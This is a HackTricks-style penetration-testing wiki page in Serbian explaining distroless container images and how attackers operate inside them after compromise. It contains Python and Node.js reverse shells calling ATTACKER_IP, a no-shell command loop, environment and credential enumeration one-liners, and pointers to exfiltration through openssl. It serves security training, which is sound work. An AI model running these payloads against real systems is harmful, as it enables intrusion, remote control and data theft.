# Distroless kontejneri

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Image kontejnera tipa **distroless** je image koji sadrži **minimalne runtime komponente potrebne za pokretanje jedne specifične aplikacije**, dok namerno uklanja uobičajene distribucione alate kao što su package managers, shells, i velike skupove generičkih korisničkih utiliteta. U praksi, distroless images često sadrže samo binarni fajl aplikacije ili runtime, njegove deljene biblioteke, bundle-ove sertifikata i vrlo malu strukturu fajl-sistema.

Poenta nije da je distroless nova kernel isolation primitive. Distroless je **strategija dizajna image-a**. Menja ono što je dostupno **inside** fajl-sistema kontejnera, a ne kako kernel izoluje kontejner. Ta razlika je bitna, jer distroless ojačava okruženje pre svega tako što smanjuje šta napadač može da iskoristi nakon što dobije code execution. Ne zamenjuje namespaces, seccomp, capabilities, AppArmor, SELinux, ili bilo koji drugi runtime isolation mehanizam.

## Zašto Distroless postoji

Distroless image-i se primarno koriste da smanje:

- veličinu image-a
- operativnu složenost image-a
- broj paketa i binarnih fajlova koji mogu sadržati ranjivosti
- broj post-exploitation alata dostupnih napadaču podrazumevano

Zato su distroless image-i popularni u produkcionim deployment-ima aplikacija. Kontejner koji ne sadrži shell, package manager i gotovo nijedan generički alat obično je lakše operativno razumeti i teže ga je zloupotrebiti interaktivno nakon kompromitacije.

Primeri poznatih distroless-stil familija image-a uključuju:

- Google's distroless images
- Chainguard hardened/minimal images

## Šta Distroless ne znači

Distroless kontejner **ne** znači:

- nije automatski rootless
- nije automatski non-privileged
- nije automatski read-only
- nije automatski zaštićen preko seccomp, AppArmor, ili SELinux
- nije automatski siguran od container escape

I dalje je moguće pokrenuti distroless image sa `--privileged`, host namespace sharing, opasnim bind mount-ovima, ili montiranim runtime socket-om. U tom scenariju, image može biti minimalan, ali kontejner i dalje može biti katastrofalno nesiguran. Distroless menja **userland attack surface**, ne **kernel trust boundary**.

## Tipične operativne karakteristike

Kada kompromitujete distroless kontejner, prvo što obično primetite je da uobičajena pretpostavke prestaju da važe. Može da nema `sh`, `bash`, `ls`, `id`, `cat`, i ponekad čak ni libc-bazirano okruženje koje se ponaša onako kako vaša uobičajena tradecraft očekuje. Ovo utiče i na ofanzivu i na odbranu, jer nedostatak alata čini debugging, incident response i post-exploitation drugačijim.

Najčešći obrasci su:

- postoji runtime aplikacije, ali skoro ništa drugo
- shell-based payloads ne uspevaju zato što nema shell-a
- uobičajeni one-lineri za enumeraciju ne rade jer helper binariji nedostaju
- fajl-sistemske zaštite kao što su read-only rootfs ili `noexec` na writable tmpfs lokacijama su često prisutne takođe

Ta kombinacija obično dovodi do toga da ljudi pričaju o "weaponizing distroless".

## Distroless i post-exploitation

Glavni ofanzivni izazov u distroless okruženju nije uvek inicijalni RCE. Često je to ono što sledi. Ako kompromitovani workload daje code execution u language runtime-u kao što su Python, Node.js, Java, ili Go, možda ćete moći da izvršavate proizvoljnu logiku, ali ne kroz uobičajene shell-centric workflow-e koji su česti na drugim Linux ciljevima.

To znači da se post-exploitation često pomera u jednom od tri pravca:

1. **Iskoristite postojeći language runtime direktno** da enumerišete okruženje, otvorite socket-e, pročitate fajlove, ili postavite dodatne payload-e.
2. **Ubacite sopstvene alate u memoriju** ako je fajl-sistem read-only ili su writable lokacije mount-ovane sa `noexec`.
3. **Iskoristite postojeće binarije koje su već prisutne u image-u** ako aplikacija ili njene zavisnosti sadrže nešto neočekivano korisno.

## Zloupotreba

### Enumerišite runtime koji već imate

U mnogim distroless kontejnerima nema shell-a, ali i dalje postoji runtime aplikacije. Ako je cilj Python servis, Python je prisutan. Ako je cilj Node.js, Node je prisutan. To često daje dovoljno funkcionalnosti za enumeraciju fajlova, čitanje environment varijabli, otvaranje reverse shells i postavljanje izvršavanja u memoriji bez ikakvog pozivanja `/bin/sh`.

Jednostavan primer sa Python-om:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Jednostavan primer sa Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Uticaj:

- oporavak promenljivih okruženja, često uključujući kredencijale ili krajnje tačke servisa
- enumeracija datotečnog sistema bez `/bin/ls`
- identifikacija zapisivih putanja i montiranih tajni

### Reverse Shell bez `/bin/sh`

Ako image ne sadrži `sh` ili `bash`, klasičan reverse shell zasnovan na shell-u može odmah da ne uspe. U tom slučaju, umesto toga koristite instalirani runtime jezika.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Ako `/bin/sh` ne postoji, zamenite poslednji red direktnim izvršavanjem komandi pokrenutim iz Pythona ili Python REPL petljom.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ponovo, ako `/bin/sh` ne postoji, koristite Node-ove filesystem, process i networking API-je direktno umesto pokretanja shell-a.

### Potpun primer: No-Shell Python komandna petlja

Ako image ima Python, ali uopšte nema shell, jednostavna interaktivna petlja često je dovoljna da zadrži punu post-exploitation capability:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Ovo ne zahteva interactive shell binary. Uticaj je efektivno isti kao basic shell iz perspektive napadača: command execution, enumeration i staging daljih payloads kroz postojeći runtime.

### In-Memory Tool Execution

Distroless images are often combined with:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Ta kombinacija čini klasične "download binary to disk and run it" workflows nepouzdanim. U tim slučajevima, memory execution techniques postaju glavno rešenje.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Postojeći binarni fajlovi već u image-u

Neki distroless images i dalje sadrže binarne fajlove neophodne za rad koji postanu korisni nakon kompromitovanja. Često uočen primer je `openssl`, jer aplikacije ponekad treba da ga koriste za crypto- ili TLS-related zadatke.

Brz obrazac pretrage je:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Ako je prisutan `openssl`, može se iskoristiti za:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

Tačna zloupotreba zavisi od toga šta je zaista instalirano, ali suština je da distroless ne znači "no tools whatsoever"; znači "far fewer tools than a normal distribution image".

## Checks

Cilj ovih provera je da utvrde da li je image zaista distroless u praksi i koji runtime ili helper binaries su i dalje dostupni za post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Šta je zanimljivo ovde:

- Ako shell ne postoji, ali postoji runtime kao Python ili Node, post-exploitation treba da se preusmeri na runtime-driven execution.
- Ako je root filesystem read-only, a `/dev/shm` je writable ali `noexec`, memory execution techniques postaju mnogo relevantnije.
- Ako pomoćni binarni fajlovi kao `openssl`, `busybox`, ili `java` postoje, oni mogu pružiti dovoljno funkcionalnosti za bootstrap daljeg pristupa.

## Runtime podrazumevane postavke

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Ključna poenta je da je distroless **svojstvo image-a**, a ne runtime zaštita. Njegova vrednost proizilazi iz smanjenja onoga što je dostupno unutar filesystem-a nakon kompromisa.

## Povezane stranice

Za filesystem i memory-execution bypasses koji su često potrebni u distroless okruženjima:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Za container runtime, socket, i mount abuse koji i dalje važe za distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
